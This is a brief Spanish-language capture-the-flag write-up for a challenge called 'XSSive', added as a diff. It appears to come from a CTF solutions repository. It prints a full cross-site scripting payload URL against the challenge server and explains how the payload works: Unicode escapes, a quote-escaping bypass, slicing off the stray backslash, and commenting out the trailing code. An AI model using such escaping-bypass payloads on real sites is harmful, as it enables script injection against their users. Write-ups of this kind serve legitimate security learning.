@@ -1,0 +1,18 @@
+XSSive
+
+http://51.68.45.226:5000/xss?name=\u0058\u0053\u0053\%22.slice(0,-1);alert(name);//
+
+Una variable que escapaba mal los valores
+
+metemos XSS en unicode
+
+\u0058\u0053\u0053
+
+como cambiaba " por \" introducimos \" para hacer el truco.
+\%22
+
+ahora tendremos en name XSS\, luego borramos el ultimo char
+.slice(0,-1);
+
+hacemos el alert comentando lo siguiente para que no coja el "; del final
+alert(name);//
